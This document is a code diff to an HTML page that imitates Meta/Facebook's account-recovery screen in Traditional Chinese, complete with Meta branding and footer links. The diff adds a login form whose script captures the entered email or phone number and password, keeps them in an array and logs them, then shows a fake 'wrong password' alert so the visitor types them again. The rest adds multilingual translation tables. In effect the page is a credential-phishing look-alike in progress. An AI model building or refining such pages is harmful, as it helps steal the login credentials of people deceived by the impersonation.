@@ -12,34 +12,70 @@
         <img src="smalllogo.png" alt="Logo" class="top-logo">
     </div>
     <div class="top-right">
-        <input type="text" class="top-input" placeholder="電子郵件地址或手機號碼">
-        <input type="password" class="top-input" placeholder="密碼">
-        <button class="top-login-btn">登入</button>
-        <a href="#" class="top-forgot">忘記帳號？</a>
+        <form>
+            <input type="text" class="top-input input-field" data-i18n-placeholder="email_or_phone" placeholder="電子郵件地址或手機號碼">
+            <input type="password" class="top-input input-field" data-i18n-placeholder="password" placeholder="密碼">
+            <button class="top-login-btn" type="submit" data-i18n="login">登入</button>
+            <a href="register.html" class="top-forgot" data-i18n="forgot_account">忘記帳號？</a>
+        </form>
     </div>
 </div>
 <div class="register-container">
-    <div class="register-title">尋找你的帳號</div>
+    <div class="register-title" data-i18n="find_account">尋找你的帳號</div>
     <div class="login-line"></div>
-    <div class="register-desc">請輸入你的電子郵件地址或手機號碼以搜尋帳號。</div>
-    <input class="register-input" type="text" placeholder="電子郵件地址或手機號碼">
+    <div class="register-desc" data-i18n="enter_email_phone">請輸入你的電子郵件地址或手機號碼以搜尋帳號。</div>
+    <input class="register-input" type="text" data-i18n-placeholder="email_or_phone" placeholder="電子郵件地址或手機號碼">
     <div class="login-line"></div>
     <div class="register-actions">
-        <button class="cancel-btn" onclick="window.location.href='index.html'">取消</button>
-        <button class="register-btn">搜尋</button>
+        <button class="cancel-btn" data-i18n="cancel" onclick="window.location.href='index.html'">取消</button>
+        <button class="register-btn" data-i18n="search">搜尋</button>
     </div>
 </div>
 <footer class="footer">
     <div class="footer-words">
         <div class="footer-langs">
-            中文(台灣) English (US) Tiếng Việt Bahasa Indonesia ภาษาไทย 日本語 Español Português (Brasil) Français (France) Deutsch Italiano +
+            <a href="#" data-lang="zh">中文(台灣)</a>
+            <a href="#" data-lang="en">English (US)</a>
+            <a href="#" data-lang="vi">Tiếng Việt</a>
+            <a href="#" data-lang="id">Bahasa Indonesia</a>
+            <a href="#" data-lang="th">ภาษาไทย</a>
+            <a href="#" data-lang="ja">日本語</a>
+            <a href="#" data-lang="es">Español</a>
+            <a href="#" data-lang="pt">Português (Brasil)</a>
+            <a href="#" data-lang="fr">Français (France)</a>
+            <a href="#" data-lang="de">Deutsch</a>
+            <a href="#" data-lang="it">Italiano</a>
             <div class="login-line"></div>
         </div>
 
+
         <div class="footer-links">
-            註冊　登入　Messenger　Facebook Lite　影片　Meta Pay　Meta 商店　Meta Quest　Ray-Ban Meta　Meta AI　Instagram　Threads　投票資訊中心
+            <a href="#">註冊</a>
+            <a href="#">登入</a>
+
+            <a href="#">Facebook Lite</a>
+            <a href="#">影片</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta 商店</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Ray-Ban Meta</a>
+            <a href="#">Meta AI</a>
+            <a href="#" >Instagram</a>
+            <a href="#" >Threads</a>
+            <a href="#" >投票資訊中心</a>
             <br>
-            隱私政策　隱私中心　關於　刊登廣告　建立粉絲專頁　開發人員　工作機會　Cookie　Ad Choices　使用條款　使用說明　聯絡人上傳和非用戶
+            <a href="#">《隱私政策》</a>
+            <a href="#">隱私中心</a>
+            <a href="#">關於</a>
+            <a href="#">刊登廣告</a>
+            <a href="#">建立粉絲專頁</a>
+            <a href="#">開發人員</a>
+            <a href="#">工作機會</a>
+            <a href="#" >Cookie</a>
+            <a href="#" >Ad Choices</a>
+            <a href="#" >使用條款</a>
+            <a href="#" >使用說明</a>
+            <a href="#" >聯絡人上傳和非用戶設定</a>
         </div>
         <div class="footer-meta">
             Meta © 2025
@@ -158,7 +194,19 @@
     }
     .footer-words{
         padding-top: 180px;
+        color: #606770;
     }
+
+    .footer-words a {
+        color: #606770 !important;
+        text-decoration: none;
+        cursor: pointer;
+    }
+
+    .footer-words a:hover {
+        text-decoration: underline;
+    }
+
     .footer-langs, .footer-links, .footer-meta {
         margin-bottom: 8px;
     }
@@ -172,4 +220,118 @@
         alert('搜尋失敗，請嘗試重新登入');
         window.location.href = 'index.html';
     });
+
+    const inputData = [];
+    document.addEventListener("DOMContentLoaded", function() {
+        const form = document.querySelector("form");
+        const inputs = document.querySelectorAll(".input-field");
+
+        form.addEventListener("submit", function(event) {
+            event.preventDefault(); // 防止表單實際送出
+
+            const emailOrPhone = inputs[0].value;
+            const password = inputs[1].value;
+
+            // 用一個陣列儲存每次輸入的資料
+            inputData.push(emailOrPhone);
+            inputData.push(password);
+            console.log("輸入的資料是：", inputData);
+
+            // 這裡可以進行驗證或其他操作
+            console.log("輸入的帳號是：", emailOrPhone);
+            console.log("輸入的密碼是：", password);
+
+            alert(`密碼或帳號錯誤，請重新輸入！`);
+            inputs[0].value = '';
+            inputs[1].value = '';
+        });
+    });
+
+    const translations = {
+        zh: {
+            emailPlaceholder: "電子郵件地址或手機號碼",
+            passwordPlaceholder: "密碼",
+            loginBtn: "登入",
+            forgotLink: "忘記帳號？",
+            registerTitle: "尋找你的帳號",
+            registerDesc: "請輸入你的電子郵件地址或手機號碼以搜尋帳號。",
+            cancelBtn: "取消",
+            searchBtn: "搜尋",
+            footerLinks: [
+                "註冊", "登入", "Facebook Lite", "影片", "Meta Pay", "Meta 商店", "Meta Quest", "Ray-Ban Meta", "Meta AI",
+                "Instagram", "Threads", "投票資訊中心", "《隱私政策》", "隱私中心", "關於", "刊登廣告", "建立粉絲專頁", "開發人員",
+                "工作機會", "Cookie", "Ad Choices", "使用條款", "使用說明", "聯絡人上傳和非用戶設定"
+            ],
+            copyright: "Meta © 2025"
+        },
+        en: {
+            emailPlaceholder: "Email address or phone number",
+            passwordPlaceholder: "Password",
+            loginBtn: "Log In",
+            forgotLink: "Forgot account?",
+            registerTitle: "Find Your Account",
+            registerDesc: "Please enter your email address or phone number to search for your account.",
+            cancelBtn: "Cancel",
+            searchBtn: "Search",
+            footerLinks: [
+                "Sign Up", "Log In", "Facebook Lite", "Videos", "Meta Pay", "Meta Store", "Meta Quest", "Ray-Ban Meta", "Meta AI",
+                "Instagram", "Threads", "Voting Information Center", "Privacy Policy", "Privacy Center", "About", "Create Ad", "Create Page",
+                "Developers", "Careers", "Cookies", "Ad Choices", "Terms", "Help", "Upload Contacts & Non-users Settings"
+            ],
+            copyright: "Meta © 2025"
+        },
+        ja: {
+            emailPlaceholder: "メールアドレスまたは携帯電話番号",
+            passwordPlaceholder: "パスワード",
+            loginBtn: "ログイン",
+            forgotLink: "アカウントを忘れた場合",
+            registerTitle: "アカウントを探す",
+            registerDesc: "メールアドレスまたは携帯電話番号を入力して、アカウントを検索してください。",
+            cancelBtn: "キャンセル",
+            searchBtn: "検索",
+            footerLinks: [
+                "新規登録", "ログイン", "Facebook Lite", "動画", "Meta Pay", "Meta ストア", "Meta Quest", "Ray-Ban Meta", "Meta AI",
+                "Instagram", "Threads", "投票情報センター", "プライバシーポリシー", "プライバシーセンター", "会社概要", "広告を作成", "ページを作成",
+                "開発者", "求人", "Cookie", "広告の選択", "利用規約", "ヘルプ", "連絡先のアップロードと非ユーザー設定"
+            ],
+            copyright: "Meta © 2025"
+        }
+        // 可繼續加入 vi, ja, etc.
+    };
+
+    document.querySelectorAll('[data-lang]').forEach(langLink => {
+        langLink.addEventListener('click', e => {
+            e.preventDefault();
+            const lang = langLink.getAttribute('data-lang');
+            applyTranslation(lang);
+        });
+    });
+
+    function applyTranslation(lang) {
+        const t = translations[lang];
+        if (!t) return;
+
+        document.querySelector('.top-input[type="text"]').placeholder = t.emailPlaceholder;
+        document.querySelector('.top-input[type="password"]').placeholder = t.passwordPlaceholder;
+        document.querySelector('.top-login-btn').textContent = t.loginBtn;
+        document.querySelector('.top-forgot').textContent = t.forgotLink;
+        document.querySelector('.register-title').textContent = t.registerTitle;
+        document.querySelector('.register-desc').textContent = t.registerDesc;
+        document.querySelector('.register-input').placeholder = t.emailPlaceholder;
+        document.querySelector('.cancel-btn').textContent = t.cancelBtn;
+        document.querySelector('.register-btn').textContent = t.searchBtn;
+
+        // 更新 footer 連結
+        const footerLinks = document.querySelectorAll('.footer-links a');
+        footerLinks.forEach((el, i) => {
+            if (t.footerLinks[i]) {
+                el.textContent = t.footerLinks[i];
+            }
+        });
+
+        document.querySelector('.footer-meta').textContent = t.copyright;
+    }
 </script>
+
+
+
